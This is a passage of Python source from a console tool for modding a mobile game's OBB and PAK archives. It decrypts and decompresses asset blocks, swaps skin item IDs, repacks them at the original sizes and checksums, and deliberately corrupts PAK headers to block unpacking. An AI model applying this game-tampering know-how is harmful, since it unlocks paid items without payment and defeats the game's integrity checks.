                keywords = [b'mount', b'file', b'entry', b'count', b'files', 
                           b'index', b'total', b'num', b'number']
                for kw in keywords:
                    if kw in ctx_lower:
                        candidates.append((offset, val))
                        break
        if len(candidates) >= 20:
            break
    return candidates


def protect_pak_file(file_path: Path, output_path: Path) -> bool:
    """Protect a PAK file with anti-unpack modifications"""
    theme = get_theme_colors()
    
    try:
        file_size = file_path.stat().st_size
        filename = file_path.name
        
        console.print(f"\n[{theme['accent']}]🔐 PROTECTING {filename}...[/]")
        
        with open(file_path, 'rb') as f_in:
            data = bytearray(f_in.read())
        
        file_size = len(data)
        modifications = 0
        category, min_files, max_files = get_size_category(file_size)
        total_steps = 8
        current_step = 0
        
        with Progress(
            BarColumn(),
            TextColumn("[progress.description]{task.description}"),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Protecting PAK...", total=total_steps)
            
            # Step 1: Method swaps
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Swapping methods...")
            
            method_swaps = [
                (b'\x02\x00\x00\x00', b'\x28\x00\x00\x00'),
                (b'\x28\x00\x00\x00', b'\x1F\x00\x00\x00'),
                (b'\x04\x00\x00\x00', b'\x11\x00\x00\x00'),
                (b'\x10\x00\x00\x00', b'\x01\x00\x00\x00'),
                (b'\x1F\x00\x00\x00', b'\x02\x00\x00\x00'),
                (b'\x29\x00\x00\x00', b'\x2A\x00\x00\x00'),
            ]
            
            for old, new in method_swaps:
                locs = find_pattern_positions(data, old)
                if locs:
                    take = max(1, int(len(locs) * 0.99))
                    take = min(take, 300)
                    for offset in random.sample(locs, min(take, len(locs))):
                        if is_safe_offset(offset, file_size):
                            data[offset:offset + len(new)] = new
                            modifications += 1
            
            # Step 2: Compression swaps
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Modifying compression...")
            
            compression_swaps = [
                (b'\x00\x00\x00\x00', b'\x06\x00\x00\x00', 0.99),
                (b'\x01\x00\x00\x00', b'\x00\x00\x00\x00', 0.99),
                (b'\x06\x00\x00\x00', b'\x01\x00\x00\x00', 0.99),
            ]
            
            for old, new, percentage in compression_swaps:
                locs = find_pattern_positions(data, old)
                if locs:
                    take = max(1, int(len(locs) * percentage))
                    if category == "large":
                        take = min(take, 1200)
                    elif category == "medium":
                        take = min(take, 800)
                    else:
                        take = min(take, 200)
                    for offset in random.sample(locs, min(take, len(locs))):
                        if is_safe_offset(offset, file_size):
                            data[offset:offset + len(new)] = new
                            modifications += 1
            
            # Step 3: Version mapping
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Version spoofing...")
            
            version_map = [
                (b'\x0C\x00\x00\x00', b'\x63\x00\x00\x00'),
                (b'\x0B\x00\x00\x00', b'\x64\x00\x00\x00'),
                (b'\x0D\x00\x00\x00', b'\x65\x00\x00\x00'),
            ]
            
            for old, new in version_map:
                locs = find_pattern_positions(data, old)
                if locs:
                    early = [l for l in locs if l < 3000000]
                    limit = 10 if category == "large" else 5
                    for offset in early[:limit]:
                        data[offset:offset + len(new)] = new
                        modifications += 1
            
            # Step 4: Block patterns
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Block modifications...")
            
            block_patterns = [
                (b'\x00\x10\x00\x00', b'\x00\x20\x00\x00'),
                (b'\x00\x20\x00\x00', b'\x00\x40\x00\x00'),
                (b'\x00\x40\x00\x00', b'\x00\x80\x00\x00'),
            ]
            
            for old, new in block_patterns:
                locs = find_pattern_positions(data, old)
                if locs:
                    limit = 15 if category == "large" else 8
                    for offset in random.sample(locs, min(limit, len(locs))):
                        if is_safe_offset(offset, file_size):
                            data[offset:offset + len(new)] = new
                            modifications += 1
            
            # Step 5: Dictionary confusion
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Dictionary confusion...")
            
            dict_locs = find_pattern_positions(data, b'\x08\x00\x00\x00')
            if dict_locs:
                limit = 20 if category == "large" else 10
                for offset in dict_locs[:limit]:
                    if is_safe_offset(offset, file_size) and offset + 8 < file_size:
                        for off in range(offset - 16, offset + 16, 4):
                            if off > 0 and off + 4 < file_size:
                                val = struct.unpack('<I', data[off:off+4])[0]
                                if val > file_size * 0.1:
                                    data[off:off+4] = b'\xFF\xFF\xFF\xFF'
                                    modifications += 1
                                    break
            
            # Step 6: Hash corruption
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Hash corruption...")
            
            none_locs = find_pattern_positions(data, b'\x00\x00\x00\x00')
            if none_locs:
                limit = 15 if category == "large" else 8
                for offset in none_locs[:limit]:
                    hash_off = offset - 20
                    if hash_off > 0:
                        try:
                            orig = data[hash_off:hash_off + 20]
                            if len(orig) == 20:
                                data[hash_off:hash_off + 2] = b'\xDE\xAD'
                                modifications += 1
                        except:
                            pass
            
            # Step 7: Mount point modification
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: Mount point spoofing...")
            
            mounts = [b'ShadowTrackerExtra', b'Content', b'InGame', b'assets']
            for mount in mounts:
                pos = data.find(mount)
                if pos != -1:
                    try:
                        data[pos + len(mount) - 1] = ord('X')
                        modifications += 1
                        break
                    except:
                        pass
            
            # Step 8: File count spoofing
            current_step += 1
            progress.update(task, advance=1, description=f"[cyan]Step {current_step}/{total_steps}: File count spoofing...")
            
            scan_regions = []
            scan_regions.append((0, min(2000000, file_size), "Start"))
            if category == "large":
                mid = file_size // 2
                scan_regions.append((mid, min(mid + 2000000, file_size), "Middle"))
            end = max(0, file_size - 3000000)
            scan_regions.append((end, file_size - 1000000, "End"))
            
            candidates = find_count_candidates(data, min_files, max_files, scan_regions)
            if candidates:
                if category == "large":
                    take = min(5, len(candidates))
                else:
                    take = 1
                for offset, orig_val in random.sample(candidates, take):
                    increase = int(orig_val * random.uniform(0.05, 0.15))
                    new_val = orig_val + increase
                    data[offset:offset + 4] = struct.pack('<I', new_val)
                    modifications += 1
            
            progress.update(task, completed=total_steps)
        
        # Write protected file
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'wb') as f_out:
            f_out.write(data)
        
        console.print(f"[{theme['success']}]✅ Protected! Modifications: {modifications}[/]")
        console.print(f"[{theme['info']}]📁 Output: {output_path}[/]")
        return True
        
    except Exception as e:
        console.print(f"[{theme['error']}]❌ Error protecting file: {e}[/]")
        return False


def handle_pak_protector():
    """PAK Protector Tool - Anti-Unpack Protection"""
    input_dir, output_dir = ensure_protector_dirs()
    theme = get_theme_colors()
    
    while True:
        show_banner()
        
        protector_menu_panel = Panel(
            f'[{theme["title"]}]🛡️  PAK PROTECTOR TOOL[/]\n'
            f'[{theme["dim"]}]{"─" * 34}[/]\n\n'
            f'[{theme["info"]}]📂 Input Folder :[/] [{theme["text"]}]{input_dir}[/]\n'
            f'[{theme["info"]}]📁 Output Folder:[/] [{theme["text"]}]{output_dir}[/]\n\n'
            f'[{theme["success"]}][1][/{theme["success"]}] PROTECT PAK FILES    [{theme["accent"]}]➛ Anti-unpack protection[/]\n'
            f'[{theme["success"]}][2][/{theme["success"]}] OPEN FOLDERS         [{theme["accent"]}]➛ Open input/output folders[/]\n'
            f'[{theme["success"]}][3][/{theme["success"]}] CLEAR OUTPUT         [{theme["accent"]}]➛ Delete protected files[/]\n\n'
            f'[{theme["error"]}][0][/{theme["error"]}] BACK TO MAIN MENU',
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(protector_menu_panel)
        console.print()
        
        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            # Protect PAK files
            pak_files = list(input_dir.glob("*.pak"))
            
            if not pak_files:
                console.print(Panel(
                    f'[{theme["error"]}]❌ No .pak files found in INPUT folder![/]\n\n'
                    f'[{theme["info"]}]💡 Place your .pak files in:[/]\n'
                    f'[{theme["text"]}]{input_dir}[/]',
                    border_style=theme["error"],
                    box=box.ROUNDED
                ))
                Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
                continue
            
            # Show file selection
            file_table = Table(
                title=f'[{theme["title"]}]📋 Select PAK to Protect[/]',
                box=box.ROUNDED,
                border_style=theme["panel_border"],
                show_header=True,
                header_style=theme["title"]
            )
            file_table.add_column("#", style=theme["accent"], justify="center", width=4)
            file_table.add_column("File Name", style=theme["text"])
            file_table.add_column("Size", style=theme["info"], justify="right")
            
            for i, pak_file in enumerate(pak_files, 1):
                size_mb = pak_file.stat().st_size / (1024 * 1024)
                file_table.add_row(str(i), pak_file.name, f"{size_mb:.2f} MB")
            
            file_table.add_row(str(len(pak_files) + 1), "Protect ALL Files", "")
            console.print(file_table)
            console.print()
            
            try:
                choice_num = int(Prompt.ask(f'[{theme["accent"]}]Select file (1-{len(pak_files)+1})[/]', default=''))
            except ValueError:
                console.print(f'[{theme["error"]}]❌ Invalid input[/]')
                Prompt.ask(f'[{theme["dim"]}]Press Enter...[/]', default='')
                continue
            
            if choice_num == len(pak_files) + 1:
                # Protect all files
                console.print(f"\n[{theme['accent']}]🔄 Protecting ALL {len(pak_files)} files...[/]\n")
                success = 0
                for pak_file in pak_files:
                    output_path = output_dir / f"{pak_file.stem}..pak"
                    if protect_pak_file(pak_file, output_path):
                        success += 1
                console.print(f"\n[{theme['success']}]✅ Protected {success}/{len(pak_files)} files[/]")
                
            elif 1 <= choice_num <= len(pak_files):
                pak_file = pak_files[choice_num - 1]
                output_path = output_dir / f"{pak_file.stem}..pak"
                protect_pak_file(pak_file, output_path)
            else:
                console.print(f'[{theme["error"]}]❌ Invalid selection[/]')
            
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
            
        elif choice == "2":
            # Open folders
            try:
                if os.path.exists('/data/data/com.termux'):
                    subprocess.run(['termux-open', str(input_dir)])
                    subprocess.run(['termux-open', str(output_dir)])
                elif sys.platform == 'linux':
                    subprocess.run(['xdg-open', str(input_dir)])
                    subprocess.run(['xdg-open', str(output_dir)])
                elif sys.platform == 'win32':
                    subprocess.run(['start', str(input_dir)], shell=True)
                    subprocess.run(['start', str(output_dir)], shell=True)
                else:
                    console.print(f'[{theme["info"]}]ℹ Input: {input_dir}[/]')
                    console.print(f'[{theme["info"]}]ℹ Output: {output_dir}[/]')
            except:
                console.print(f'[{theme["info"]}]ℹ Input: {input_dir}[/]')
                console.print(f'[{theme["info"]}]ℹ Output: {output_dir}[/]')
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
            
        elif choice == "3":
            # Clear output
            output_files = list(output_dir.glob("*"))
            if not output_files:
                console.print(f'[{theme["warning"]}]⚠ No files to clear[/]')
            else:
                confirm = Prompt.ask(f'[{theme["error"]}]Delete ALL {len(output_files)} protected file(s)? (y/n)[/]',
                                    choices=['y', 'n'], default='n')
                if confirm == 'y':
                    deleted = 0
                    for f in output_files:
                        try:
                            f.unlink()
                            deleted += 1
                        except:
                            pass
                    console.print(f'[{theme["success"]}]✅ Deleted {deleted} file(s)[/]')
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
            
        elif choice == "0":
            break
        
        else:
            console.print(Panel(
                f'[{theme["error"]}]❌ Option {choice} is invalid[/]',
                border_style=theme["error"],
                box=box.ROUNDED
            ))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

# ==================== SKIN TOOL PAK CLASS ====================

class PAKToolSkin:
    def __init__(self, game_base_dir):
        self.DICT_MARKER = bytes.fromhex("37 A4 30 EC")
        self.DAT_MAGIC = bytes.fromhex("51 CC 56 84")
        self.XOR_KEY = 0x79
        self.DICT_SIZE = 1024 * 1024
        self.game_base_dir = Path(game_base_dir)
        self.input_dir = self.game_base_dir / "input"
        self.repack_obb_dir = self.game_base_dir / "repack_obb"
        self.unpack_pak_dir = self.game_base_dir / "unpack_pak"
        self.edited_dat_dir = self.game_base_dir / "edited_dat"
        self.repack_pak_dir = self.game_base_dir / "repack_pak"
        self.tmp_dir = self.game_base_dir / "tmp"
        self.unpacked_obb_dir = self.game_base_dir / "unpacked_obb"
        
        for dir_path in [self.input_dir, self.repack_obb_dir, self.unpack_pak_dir,
                        self.edited_dat_dir, self.repack_pak_dir, self.tmp_dir, self.unpacked_obb_dir]:
            dir_path.mkdir(parents=True, exist_ok=True)

    def get_pak_file(self, pak_path=None):
        if pak_path and os.path.exists(pak_path):
            return pak_path
        
        existing_pak = self.tmp_dir / "mini_obbzsdic_obb.pak"
        if existing_pak.exists():
            return existing_pak
        else:
            obb_path = self.find_obb_file()
            return self.extract_pak_from_obb(obb_path)

    def find_obb_file(self):
        obb_files = list(self.input_dir.glob("*.obb"))
        if not obb_files:
            raise FileNotFoundError("No OBB file found in input directory")
        return obb_files[0]

    def extract_pak_from_obb(self, obb_path):
        console.print(f"[cyan]Processing OBB: {obb_path.name}[/cyan]")
        temp_extract_dir = self.tmp_dir / "temp_extract"
        
        if temp_extract_dir.exists():
            shutil.rmtree(temp_extract_dir)
        temp_extract_dir.mkdir()

        try:
            with zipfile.ZipFile(obb_path, 'r') as zip_ref:
                all_files = zip_ref.namelist()
                target_pak = None
                
                for file_path in all_files:
                    if file_path.endswith('mini_obbzsdic_obb.pak'):
                        target_pak = file_path
                        break
                
                if not target_pak:
                    for file_path in all_files:
                        if 'zsdic' in file_path.lower() and file_path.endswith('.pak'):
                            target_pak = file_path
                            break
                
                if not target_pak:
                    pak_files = [f for f in all_files if f.endswith('.pak')]
                    if pak_files:
                        target_pak = pak_files[0]
                
                if not target_pak:
                    raise FileNotFoundError("No suitable PAK file found in OBB")
                
                console.print(f"[green]Extracting: {target_pak}[/green]")
                with zip_ref.open(target_pak) as source:
                    extracted_pak = self.tmp_dir / "mini_obbzsdic_obb.pak"
                    with open(extracted_pak, 'wb') as target:
                        shutil.copyfileobj(source, target)
                
                return extracted_pak
        finally:
            if temp_extract_dir.exists():
                shutil.rmtree(temp_extract_dir)

    def find_dictionary(self, pak_data):
        dict_pos = pak_data.find(self.DICT_MARKER)
        if dict_pos == -1:
            raise ValueError("Dictionary marker not found in PAK file")
        
        dictionary = pak_data[dict_pos:dict_pos + self.DICT_SIZE]
        return dictionary, dict_pos

    def find_dat_files(self, pak_data, dict_pos):
        dat_files = []
        pos = 0
        
        while pos < dict_pos:
            magic_pos = pak_data.find(self.DAT_MAGIC, pos)
            if magic_pos == -1 or magic_pos >= dict_pos:
                break
            
            next_magic = pak_data.find(self.DAT_MAGIC, magic_pos + 4)
            if next_magic == -1 or next_magic >= dict_pos:
                dat_size = dict_pos - magic_pos
            else:
                dat_size = next_magic - magic_pos
            
            dat_data = pak_data[magic_pos:magic_pos + dat_size]
            dat_files.append({
                'index': len(dat_files),
                'position': magic_pos,
                'size': dat_size,
                'data': dat_data
            })
            
            pos = magic_pos + 4
        
        return dat_files

    def xor_decrypt(self, data):
        return bytes(b ^ self.XOR_KEY for b in data)

    def decompress_dat(self, dat_data_with_magic, dictionary):
        import zstandard as zstd
        decrypted = self.xor_decrypt(dat_data_with_magic)
        d = zstd.ZstdDecompressor(dict_data=zstd.ZstdCompressionDict(dictionary))
        decompressed = b''
        reader = d.stream_reader(decrypted)
        
        try:
            while True:
                chunk = reader.read(65536)
                if not chunk:
                    break
                decompressed += chunk
        except zstd.ZstdError:
            pass
        finally:
            reader.close()
        
        return decompressed

    def apply_size_fix_to_file(self, file_path, max_nulls):
        if not os.path.exists(file_path):
            return
        
        null_path = NULL_TXT
        modskin_path = MODSKIN_TXT
        nulled_log_path = NULLED_LOG_TXT
        
        mod_ids = set()
        if os.path.isfile(modskin_path):
            pairs = parse_id_pairs_skin(modskin_path)
            for a, b in pairs:
                if a.isdigit():
                    mod_ids.add(a)
                if b.isdigit():
                    mod_ids.add(b)
        
        master_null_ids = []
        if os.path.isfile(null_path):
            with open(null_path, encoding='utf-8') as nf:
                for line in nf:
                    m = re.search(r'\bID\s+(\d+)\b', line) or re.search(r'(\d{3,})', line)
                    if m:
                        master_null_ids.append(m.group(1).encode())
        
        seen = set()
        unique_master_ids = [x for x in master_null_ids if not (x in seen or seen.add(x))]
        
        null_ids = [nid for nid in unique_master_ids if not (nid.decode().startswith('40') or nid.decode() in mod_ids)]
        
        with open(file_path, 'rb') as f:
            data = bytearray(f.read())
        
        nulls = 0
        nulled_patterns = []
        matches = []
        
        for id_bytes in null_ids:
            start_search = 0
            while (pos := data.find(id_bytes, start_search)) >= 0:
                matches.append((pos, id_bytes))
                start_search = pos + 1
        
        matches.sort(key=lambda x: x[0], reverse=True)
        
        for pos, id_bytes in matches:
            if nulls >= max_nulls or pos + len(id_bytes) + 5 > len(data):
                continue
            
            before = data[pos - 1:pos] if pos > 0 else None
            after = data[pos + len(id_bytes) + 5:pos + len(id_bytes) + 6] if pos + len(id_bytes) + 5 < len(data) else None
            
            if not ((before and before in b"0123456789") or (after and after in b"0123456789")):
                data[pos:pos + len(id_bytes) + 5] = b'\x00' * (len(id_bytes) + 5)
                nulls += 1
        
        with open(file_path, 'wb') as f:
            f.write(data)

    def repack_single_file(self, edited_file, dat_files, pak_data, dictionary, null_count, skip_size_fix=False):
        filename = edited_file.stem
        
        try:
            dat_number = int(filename.lstrip('0')) if filename != '0000000' else 0
            dat_index = dat_number - 1
        except ValueError:
            return False, pak_data
        
        if dat_index < 0 or dat_index >= len(dat_files):
            return False, pak_data
        
        if not skip_size_fix:
            self.apply_size_fix_to_file(str(edited_file), null_count)
        
        with open(edited_file, 'rb') as f:
            edited_data = f.read()
        
        original_dat = dat_files[dat_index]
        original_size = original_dat['size']
        required_size = original_size - 4
        checksum = original_dat['data'][-4:]
        
        compressed_data = None
        import zstandard as zstd
        dict_obj = zstd.ZstdCompressionDict(dictionary)
        final_clen = 0
        
        for level in range(1, 23):
            try:
                cctx = zstd.ZstdCompressor(level=level, dict_data=dict_obj)
                test_compressed = cctx.compress(edited_data)
                clen = len(test_compressed)
                final_clen = clen
                
                if clen <= required_size:
                    dctx = zstd.ZstdDecompressor(dict_data=dict_obj)
                    verified = dctx.decompress(test_compressed)
                    if verified == edited_data:
                        compressed_data = test_compressed
                        break
            except Exception:
                continue
        
        if compressed_data is None:
            return False, pak_data
        
        new_dat_block = bytearray(compressed_data)
        if len(compressed_data) < required_size:
            padding_needed = required_size - len(compressed_data)
            new_dat_block.extend(b'\x00' * padding_needed)
        
        xor_encrypted_data = self.xor_decrypt(new_dat_block)
        new_dat_block = bytearray(xor_encrypted_data)
        new_dat_block.extend(checksum)
        
        if len(new_dat_block) != original_size:
            return False, pak_data
        
        start_pos = original_dat['position']
        end_pos = start_pos + original_dat['size']
        pak_data[start_pos:end_pos] = new_dat_block
        
        return True, pak_data

    def repack_pak_with_retry(self, initial_nulls=10):
        console.print("[bold cyan]Repacking edits from edited_dat...[/]")
        
        zsdic_edited_dir = self.game_base_dir / "zsdic_edited_dats"
        include_zsdic = False
        zsdic_edited_files = []
        
        if zsdic_edited_dir.exists():
            zsdic_file_count = len(list(zsdic_edited_dir.glob("*.dat")))
            if zsdic_file_count > 0:
                console.print(f"[yellow]Found {zsdic_file_count} files in zsdic_edited_dats folder[/]")
                response = Prompt.ask("[bold cyan]Include files from zsdic_edited_dats (no size fix)?[/]", choices=["y", "n"], default="n")
                include_zsdic = (response.lower() == "y")
        
        pak_path = self.get_pak_file()
        with open(pak_path, 'rb') as f:
            pak_data = bytearray(f.read())
        
        dictionary, dict_pos = self.find_dictionary(pak_data)
        dat_files = self.find_dat_files(pak_data, dict_pos)
        
        edited_files = list(self.edited_dat_dir.glob("*.dat"))
        
        if include_zsdic:
            zsdic_edited_files = list(zsdic_edited_dir.glob("*.dat"))
            console.print(f"[green]✔ Including {len(zsdic_edited_files)} files from zsdic_edited_dats (no size fix)[/]")
        
        skip_size_fix_files = {f: True for f in zsdic_edited_files}
        all_edited_files = edited_files + zsdic_edited_files
        
        if not all_edited_files:
            console.print("[yellow]⚠ No DAT files found[/]")
            return False
        
        current_nulls = initial_nulls
        max_nulls = 200
        failed_files = set(all_edited_files)
        iteration = 1
        
        while current_nulls <= max_nulls and failed_files:
            console.print(f"[cyan]Iteration {iteration}: Trying repack with {current_nulls} nulls on {len(failed_files)} files[/]")
            
            new_failed = set()
            for edited_file in failed_files:
                skip_fix = skip_size_fix_files.get(edited_file, False)
                success, pak_data = self.repack_single_file(edited_file, dat_files, pak_data, dictionary, current_nulls, skip_fix)
                if not success:
                    new_failed.add(edited_file)
            
            if not new_failed:
                pak_filename = "mini_obbzsdic_obb.pak"
                repacked_pak_path = self.repack_pak_dir / pak_filename
                
                with open(repacked_pak_path, 'wb') as f:
                    f.write(pak_data)
                
                console.print(f"[bold green]✅ Repacked to {repacked_pak_path}[/]")
                return True
            
            if current_nulls >= max_nulls:
                console.print(f"[red]✖ Failed with max nulls ({max_nulls}).[/]")
                return False
            
            failed_files = new_failed
            current_nulls = min(current_nulls * 2, max_nulls)
            iteration += 1
        
        return False

    def repack_obb(self):
        console.print("[bold cyan]Starting OBB repack process...[/]")
        
        try:
            original_obb_path = self.find_obb_file()
            original_size = os.path.getsize(original_obb_path)
            obb_filename = original_obb_path.name
            
            pak_name = "mini_obbzsdic_obb.pak"
            pak_src = self.repack_pak_dir / pak_name
            mini_pak_src = self.repack_pak_dir / MINI_PAK_FILE
            
            if not pak_src.exists():
                console.print(f"[red]✖ {pak_name} not found in {self.repack_pak_dir}[/]")
                return False
            
            console.print(f"[cyan]📦 Unpacking OBB to {self.unpacked_obb_dir}...[/]")
            if self.unpacked_obb_dir.exists():
                shutil.rmtree(self.unpacked_obb_dir)
            
            with zipfile.ZipFile(original_obb_path, 'r') as zf:
                zf.extractall(self.unpacked_obb_dir)
            
            pak_replaced = False
            for root, dirs, files in os.walk(self.unpacked_obb_dir):
                for file in files:
                    if file.endswith('.pak'):
                        file_path = Path(root) / file
                        if 'zsdic' in file.lower() or file == pak_name:
                            shutil.copy2(pak_src, file_path)
                            console.print(f"[green]✔ Replaced ZSDIC PAK: {file_path.relative_to(self.unpacked_obb_dir)}[/]")
                            pak_replaced = True
                        elif file == MINI_PAK_FILE and mini_pak_src.exists():
                            shutil.copy2(mini_pak_src, file_path)
                            console.print(f"[green]✔ Replaced Mini PAK: {file_path.relative_to(self.unpacked_obb_dir)}[/]")
            
            if not pak_replaced:
                pak_dest = self.unpacked_obb_dir / "ShadowTrackerExtra" / "Content" / "Paks" / pak_name
                pak_dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(pak_src, pak_dest)
            
            console.print(f"[cyan]📦 Repacking OBB...[/]")
            final_obb_path = self.repack_obb_dir / obb_filename
            
            with zipfile.ZipFile(final_obb_path, 'w', zipfile.ZIP_STORED) as zf:
                for root, dirs, files in os.walk(self.unpacked_obb_dir):
                    for file in files:
                        file_path = Path(root) / file
                        arcname = file_path.relative_to(self.unpacked_obb_dir)
                        zf.write(file_path, arcname)
            
            actual_size = os.path.getsize(final_obb_path)
            if actual_size < original_size:
                with open(final_obb_path, 'ab') as f:
                    f.write(b'\x00' * (original_size - actual_size))
            
            final_dir = BASE_DIR / "SKIN_TOOL" / "FINAL"
            final_dir.mkdir(parents=True, exist_ok=True)
            final_final_path = final_dir / obb_filename
            shutil.copy2(final_obb_path, final_final_path)
            
            console.print(f"[bold green]✅ OBB repack completed: {final_final_path}[/]")
            return True
            
        except Exception as e:
            console.print(f"[red]✖ OBB repack failed: {e}[/]")
            return False

def updated_repack_obb_with_both_paks(self):
    """Repack OBB using BOTH paks from SKIN_TOOL/SKIN_FOLDER/repack_pak folder"""
    console.print("[bold cyan]Starting OBB repack with both PAKs...[/]")
    
    try:
        original_obb_path = self.find_obb_file()
        original_size = os.path.getsize(original_obb_path)
        obb_filename = original_obb_path.name
        
        repack_pak_dir = SKIN_TOOL_DIR / "SKIN_FOLDER" / "repack_pak"
        zsdic_pak = repack_pak_dir / "mini_obbzsdic_obb.pak"
        mini_pak = repack_pak_dir / MINI_PAK_FILE
        
        if not zsdic_pak.exists():
            console.print(f"[red]✖ ZSDIC PAK not found[/red]")
            return False
        
        if not mini_pak.exists():
            console.print(f"[red]✖ Mini PAK not found[/red]")
            return False
        
        console.print(f"[cyan]📦 Unpacking OBB to {self.unpacked_obb_dir}...[/cyan]")
        if self.unpacked_obb_dir.exists():
            shutil.rmtree(self.unpacked_obb_dir)
        
        with zipfile.ZipFile(original_obb_path, 'r') as zf:
            zf.extractall(self.unpacked_obb_dir)
        
        pak_replacements = 0
        for root, dirs, files in os.walk(self.unpacked_obb_dir):
            for file in files:
                if file.endswith('.pak'):
                    file_path = Path(root) / file
                    if 'zsdic' in file.lower() or file == "mini_obbzsdic_obb.pak":
                        shutil.copy2(zsdic_pak, file_path)
                        pak_replacements += 1
                    elif file == MINI_PAK_FILE:
                        shutil.copy2(mini_pak, file_path)
                        pak_replacements += 1
        
        console.print(f"[cyan]📦 Repacking OBB...[/cyan]")
        final_obb_path = self.repack_obb_dir / obb_filename
        
        with zipfile.ZipFile(final_obb_path, 'w', zipfile.ZIP_STORED) as zf:
            for root, dirs, files in os.walk(self.unpacked_obb_dir):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(self.unpacked_obb_dir)
                    zf.write(file_path, arcname)
        
        actual_size = os.path.getsize(final_obb_path)
        if actual_size < original_size:
            with open(final_obb_path, 'ab') as f:
                f.write(b'\x00' * (original_size - actual_size))
        
        final_dir = SKIN_TOOL_DIR / "FINAL"
        final_dir.mkdir(parents=True, exist_ok=True)
        final_final_path = final_dir / obb_filename
        shutil.copy2(final_obb_path, final_final_path)
        
        console.print(f"[bold green]✅ OBB repack completed with both PAKs[/]")
        return True
        
    except Exception as e:
        console.print(f"[red]✖ OBB repack failed: {e}[/red]")
        return False

# Update the PAKToolSkin method
PAKToolSkin.repack_obb = updated_repack_obb_with_both_paks

# ==================== SKIN TOOL MOD SKIN FLOW ====================

def skin_mod_flow():
    console.print(Panel("[bold bright_cyan]🚀 Mod Skin Initialized[/]", expand=False, border_style="cyan"))
    
    game_base_dir = SKIN_TOOL_DIR / "SKIN_FOLDER"
    txt_path = MODSKIN_TXT
    output_dir = game_base_dir / "skindats"
    edited_dir = game_base_dir / "edited_dat"
    changelog_path = CHANGELOG_TXT
    
    if not os.path.isfile(txt_path):
        console.print(f"[red]✖ {MODSKIN_TXT} missing[/]")
        return False
    
    # Auto-add attachment ID pairs from attach.txt
    try:
        attach_path = ATTACH_TXT
        if os.path.isfile(attach_path):
            def parse_attach_blocks(content):
                gun_map = {}
                blocks = content.split('------------------------')
                for block in blocks:
                    if not block.strip():
                        continue
                    gun_id = None
                    parts = {'MAG': [], 'SIGHT': [], 'STOCK': []}
                    for raw in block.splitlines():
                        line = raw.strip()
                        if not line or ':' not in line or '|' not in line:
                            continue
                        try:
                            ptype, rest = line.split(':', 1)
                            ptype = ptype.strip().upper()
                            item_id, _name = rest.split('|', 1)
                            item_id = item_id.strip()
                            if ptype == 'GUN':
                                gun_id = item_id
                            elif ptype in parts:
                                parts[ptype].append(item_id)
                        except Exception:
                            continue
                    if gun_id:
                        gun_map.setdefault(gun_id, {'MAG': [], 'SIGHT': [], 'STOCK': []})
                        for k in ('MAG', 'SIGHT', 'STOCK'):
                            gun_map[gun_id][k].extend(parts[k])
                return gun_map
            
            with open(attach_path, 'r', encoding='utf-8', errors='ignore') as f:
                attach_content = f.read()
            gun_map = parse_attach_blocks(attach_content)
            
            if gun_map:
                pairs = parse_id_pairs_skin(txt_path)
                existing = set(pairs)
                to_append = []
                
                for g1, g2 in pairs:
                    if g1 in gun_map and g2 in gun_map:
                        for atype in ('MAG', 'SIGHT', 'STOCK'):
                            a1 = gun_map[g1].get(atype, [])
                            a2 = gun_map[g2].get(atype, [])
                            n = min(len(a1), len(a2))
                            for i in range(n):
                                p = (a1[i], a2[i])
                                if p not in existing:
                                    to_append.append(p)
                                    existing.add(p)
                
                if to_append:
                    with open(txt_path, 'a', encoding='utf-8') as f:
                        for a, b in to_append:
                            f.write(f"\n{a} {b}")
                    console.print(f"[green]✔ Added {len(to_append)} attachment ID pairs from attach.txt[/]")
    except Exception as e:
        console.print(f"[yellow]Skipping attachment auto-add: {e}[/]")
    
    with console.status("[bold green]Reading ID pairs...[/]"):
        pairs = parse_id_pairs_skin(txt_path)
    
    if not pairs:
        console.print(f"[yellow]⚠ No valid ID pairs found in {MODSKIN_TXT}[/]")
        return False
    
    console.print(f"[green]✔ Found {len(pairs)} ID pairs.[/]")
    
    format_choice = prompt_modskin_format_short()
    
    if format_choice == "A":
        pairs = [(b, a) for (a, b) in pairs]
    
    output_dir.mkdir(parents=True, exist_ok=True)
    all_files = [f for f in output_dir.iterdir() if f.is_file()]
    
    if not all_files:
        console.print(f"[red]✖ Output directory not found: {output_dir}[/]")
        return False
    
    console.print(f"[green]✔ Found {len(all_files)} files to process.[/]")
    
    cache = {p: p.read_bytes() for p in all_files}
    longhex_map = {}
    
    with console.status("[bold green]Building longhex map...[/]"):
        for id1, id2 in pairs:
            a1, a2 = id1.encode(), id2.encode()
            p1, p2 = build_safe_pattern(a1), build_safe_pattern(a2)
            pos1, pos2, d1, d2 = None, None, b"", b""
            
            for data in cache.values():
                if pos1 is None and (m := p1.search(data)):
                    pos1, d1 = m.start(), data
                if pos2 is None and (m := p2.search(data)):
                    pos2, d2 = m.start(), data
                if pos1 is not None and pos2 is not None:
                    break
            
            if pos1 is None or pos2 is None:
                continue
            
            lh1 = a1 + d1[pos1 + len(a1):pos1 + len(a1) + 5]
            lh2 = a2 + d2[pos2 + len(a2):pos2 + len(a2) + 5]
            
            digit_len_diff = abs(len(a1) - len(a2))
